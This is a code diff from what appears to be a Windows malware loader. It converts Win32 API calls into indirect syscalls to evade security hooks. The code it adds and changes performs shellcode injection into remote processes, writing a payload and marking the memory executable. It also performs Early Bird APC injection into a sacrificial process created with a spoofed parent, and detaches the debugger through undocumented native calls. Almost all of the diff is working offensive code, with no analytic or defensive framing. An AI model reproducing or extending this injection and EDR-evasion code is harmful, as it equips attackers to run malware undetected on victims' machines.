@@ -49,7 +49,6 @@ BOOL IsProcessElevated(HANDLE hProcess) {
 	TOKEN_ELEVATION elevation = { 0 };
 	ULONG			dwSize = 0;
 
-	// TODO: use syscall NtOpenProcessToken
 	WhisperHell(g_SyscallsTable.NtOpenProcessToken.wSystemCall);
 	if ((status = NtOpenProcessToken(
 		hProcess,
@@ -60,7 +59,6 @@ BOOL IsProcessElevated(HANDLE hProcess) {
 		return FALSE;  // Assume not elevated if we can't open the token
 	}
 
-	// TODO: use syscall NtQueryInformationToken
 	WhisperHell(g_SyscallsTable.NtQueryInformationToken.wSystemCall);
 	if ((status = NtQueryInformationToken(
 		hToken,
@@ -102,7 +100,7 @@ BOOL GetRemoteProcessHandle(IN LPCWSTR pwstrProcName, IN DWORD* pdwPid, IN HANDL
 	// Allocating enough buffer for the returned array of `SYSTEM_PROCESS_INFORMATION` struct
 	SystemProcInfo = (PSYSTEM_PROCESS_INFORMATION)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, uReturnLen1);
 	if (SystemProcInfo == NULL) {
-		PRINTA("[!] HeapAlloc Failed With Error :  0x%0.8X\n", GetLastError());
+		PRINTA("[!] HeapAlloc Failed With Error : 0x%0.8X\n", GetLastError());
 		return FALSE;
 	}
 
@@ -110,7 +108,7 @@ BOOL GetRemoteProcessHandle(IN LPCWSTR pwstrProcName, IN DWORD* pdwPid, IN HANDL
 	// Calling NtQuerySystemInformation with the correct arguments, the output will be saved to 'SystemProcInfo'
 	WhisperHell(g_SyscallsTable.NtQuerySystemInformation.wSystemCall);
 	if ((status = NtQuerySystemInformation(SystemProcessInformation, SystemProcInfo, uReturnLen1, &uReturnLen2) != 0x0)) {
-		PRINTA("[!] NtQuerySystemInformation Failed With Error :  0x%0.8X\n", status);
+		PRINTA("[!] NtQuerySystemInformation [SystemProcessInformation] Failed With Error :  0x%0.8X\n", status);
 		return FALSE;
 	}
 	PRINTA("[+] Retrieved SystemProcInfo Structure At %p with Actual Retrieved Size: %d\n", SystemProcInfo, uReturnLen2);
@@ -294,7 +292,6 @@ BOOL RemoteMappingInjectionViaSyscalls(IN HANDLE hProcess, IN PVOID pPayload, IN
 	return TRUE;
 }
 
-// Function used for APC Injection with PPID Spoofing
 BOOL CreatePpidSpoofedProcessWithAlertableThread(IN HANDLE hParentProcess, IN LPCSTR lpProcessName, OUT DWORD* dwProcessId, OUT HANDLE* hProcess, OUT HANDLE* hThread)
 {
 	CHAR                               lpPath[MAX_PATH * 2];
@@ -407,7 +404,7 @@ BOOL InjectShellcodeToRemoteProcess(HANDLE hProcess, PBYTE pShellcode, SIZE_T sS
 		MEM_COMMIT | MEM_RESERVE,
 		PAGE_READWRITE))
 		!= 0x0) {
-		PRINTA("[!] VirtualAllocEx Failed With Error : %d \n", GetLastError());
+		PRINTA("[!] NtAllocateVirtualMemory Failed With Error : %d \n", GetLastError());
 		return FALSE;
 	}
 	PRINTA("[+] Allocated Memory At : 0x%p With Allocated Size: %d \n", pShellcodeAddress, (DWORD)sNumberOfBytesAllocated);
@@ -425,7 +422,7 @@ BOOL InjectShellcodeToRemoteProcess(HANDLE hProcess, PBYTE pShellcode, SIZE_T sS
 		sSizeOfShellcode,
 		&sNumberOfBytesWritten)) != 0x0 ||
 		sNumberOfBytesWritten != sSizeOfShellcode) {
-		PRINTA("[!] WriteProcessMemory Failed With Error : %d \n", GetLastError());
+		PRINTA("[!] NtWriteVirtualMemory Failed With Error : %d \n", GetLastError());
 		return FALSE;
 	}
 	PRINTA("[+] Successfully Written %d Bytes\n", (DWORD)sNumberOfBytesWritten);
@@ -433,15 +430,15 @@ BOOL InjectShellcodeToRemoteProcess(HANDLE hProcess, PBYTE pShellcode, SIZE_T sS
 	ZeroMemoryEx(pShellcode, sSizeOfShellcode);
 
 	// Make the memory region executable
-	WhisperHell(g_SyscallsTable.NtProtectVirtualMemory.wSystemCall);	
+	WhisperHell(g_SyscallsTable.NtProtectVirtualMemory.wSystemCall);
 	if ((status = NtProtectVirtualMemory(
-		hProcess, 
-		&pShellcodeAddress, 
+		hProcess,
+		&pShellcodeAddress,
 		&sNumberOfBytesWritten,
-		PAGE_EXECUTE_READWRITE, 
+		PAGE_EXECUTE_READWRITE,
 		&dwOldProtection))
 		!= 0x0) {
-		PRINTA("[!] VirtualProtectEx Failed With Error : %d \n", GetLastError());
+		PRINTA("[!] NtProtectVirtualMemory Failed With Error : %d \n", GetLastError());
 		return FALSE;
 	}
 
@@ -450,13 +447,14 @@ BOOL InjectShellcodeToRemoteProcess(HANDLE hProcess, PBYTE pShellcode, SIZE_T sS
 	return TRUE;
 }
 
-// TODO: use syscalls and API hashing
 BOOL RemoteEarlyBirdApcInjectionViaSyscalls(HANDLE hParentProcess, LPCSTR pstrSacrificalProcessName, PVOID pShellcodeAddress, SIZE_T sSizeOfShellcode)
 {
-
-	HANDLE hProcess = NULL, hThread = NULL;
-	DWORD dwProcessId = 0;
-	PVOID pInjectedAddress = NULL;
+	NTSTATUS	status = 0;
+	HANDLE		hProcess = NULL, hThread = NULL, hDebugObject = NULL;
+	DWORD		dwProcessId = 0;
+	PVOID		pInjectedAddress = NULL;
+	SIZE_T		sInjectedSize = sSizeOfShellcode;
+	ULONG		uReturnedLength = 0;
 
 	// Create the sacrificial process
 	if (!CreatePpidSpoofedProcessWithAlertableThread(hParentProcess, pstrSacrificalProcessName, &dwProcessId, &hProcess, &hThread)) {
@@ -477,18 +475,39 @@ BOOL RemoteEarlyBirdApcInjectionViaSyscalls(HANDLE hParentProcess, LPCSTR pstrSa
 	PRINTA("[#] Press <Enter> To Queue The APC ... \n");
 	GETCHAR();
 
-	// TODO: use syscall NtQueueApcThread
 	// Queue the APC to the thread
-	if (!QueueUserAPC((PAPCFUNC)pInjectedAddress, hThread, NULL)) {
-		PRINTA("[!] QueueUserAPC Failed With Error : %d \n", GetLastError());
+	WhisperHell(g_SyscallsTable.NtQueueApcThread.wSystemCall);
+	if ((status = NtQueueApcThread(
+		hThread,
+		(PAPCFUNC)pInjectedAddress,
+		NULL, NULL, NULL))
+		!= 0x0) {
+		PRINTA("[!] NtQueueApcThread Failed With Error : %d \n", GetLastError());
 		return FALSE;
 	}
 	PRINTA("[+] APC Queued Successfully To Thread With TID : %d\n", GetThreadId(hThread));
 
-	// TODO: use syscall NtRemoveProcessDebug
+	// Get debug object handle for detaching the debugger
+	//? We only invoke it once as we know the size of the returned bytes is the size of a HANDLE
+	WhisperHell(g_SyscallsTable.NtQueryInformationProcess.wSystemCall);
+	if ((status = NtQueryInformationProcess(
+		hProcess,
+		ProcessDebugObjectHandle,
+		&hDebugObject,
+		sizeof(HANDLE),
+		&uReturnedLength))
+		!= 0x0) {
+		PRINTA("[!] NtQueryInformationProcess [ProcessDebugObjectHandle] Failed With Error : %d \n", GetLastError());
+		return FALSE;
+	}
+
 	// Detach the debugger
-	if (!DebugActiveProcessStop(dwProcessId)) {
-		PRINTA("[!] DebugActiveProcessStop Failed With Error : %d \n", GetLastError());
+	WhisperHell(g_SyscallsTable.NtRemoveProcessDebug.wSystemCall);
+	if ((status = NtRemoveProcessDebug(
+		hProcess, 
+		hDebugObject)) 
+		!= 0x0) {
+		PRINTA("[!] NtRemoveProcessDebug Failed With Error : %d \n", GetLastError());
 		return FALSE;
 	}
 
@@ -501,9 +520,16 @@ BOOL RemoteEarlyBirdApcInjectionViaSyscalls(HANDLE hParentProcess, LPCSTR pstrSa
 		return FALSE;
 	}
 
-	// TODO: use syscall NtFreeVirtualMemory
 	// Clean up
-	if (!VirtualFreeEx(hProcess, pInjectedAddress, 0, MEM_RELEASE)) {
+	//! This will fail if the process is terminated, typically when the shellcode is executed successfully
+	//! So we will ignore the return value
+	WhisperHell(g_SyscallsTable.NtFreeVirtualMemory.wSystemCall);
+	if ((status = NtFreeVirtualMemory(
+		hProcess, 
+		&pInjectedAddress, 
+		&sInjectedSize,
+		MEM_RELEASE))
+		!= 0x0) {
 		PRINTA("[!] VirtualFreeEx Failed With Error : %d \n", GetLastError());
 		return FALSE;
 	}
